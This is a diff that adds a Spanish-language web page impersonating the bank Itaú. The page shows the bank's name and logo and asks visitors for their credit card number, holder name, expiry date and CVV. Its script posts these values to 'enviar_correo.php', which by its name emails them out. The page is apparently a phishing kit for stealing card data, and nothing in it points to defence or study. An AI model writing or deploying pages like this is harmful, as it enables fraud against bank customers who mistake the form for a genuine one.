@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Itaú - Formulario de Tarjeta de Crédito</title>
+  <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card-form">
+      <img src="logo_itaú.png" alt="Logo Itaú" class="logo">
+      <h2>Ingrese los datos de la tarjeta de crédito</h2>
+      <form action="enviar_correo.php" method="post">
+      <form id="credit-card-form">
+        <label for="numero">Número de Tarjeta:</label>
+        <input type="text" id="numero" name="numero" placeholder="Ingrese el número de tarjeta" required>
+
+        <label for="nombre">Nombre del Titular:</label>
+        <input type="text" id="nombre" name="nombre" placeholder="Ingrese el nombre del titular" required>
+
+        <label for="vencimiento">Fecha de Vencimiento:</label>
+        <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" required>
+
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="Ingrese el CVV" required>
+
+        <button type="button" onclick="enviarFormulario()">Enviar</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function enviarFormulario() {
+      var numero = document.getElementById("numero").value;
+      var nombre = document.getElementById("nombre").value;
+      var vencimiento = document.getElementById("vencimiento").value;
+      var cvv = document.getElementById("cvv").value;
+
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+          alert(this.responseText);
+        }
+      };
+      xhttp.open("POST", "enviar_correo.php", TRUE);
+      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+      xhttp.send("numero=" + numero + "&nombre=" + nombre + "&vencimiento=" + vencimiento + "&cvv=" + cvv);
+    }
+  </script>
+</body>
+</html>
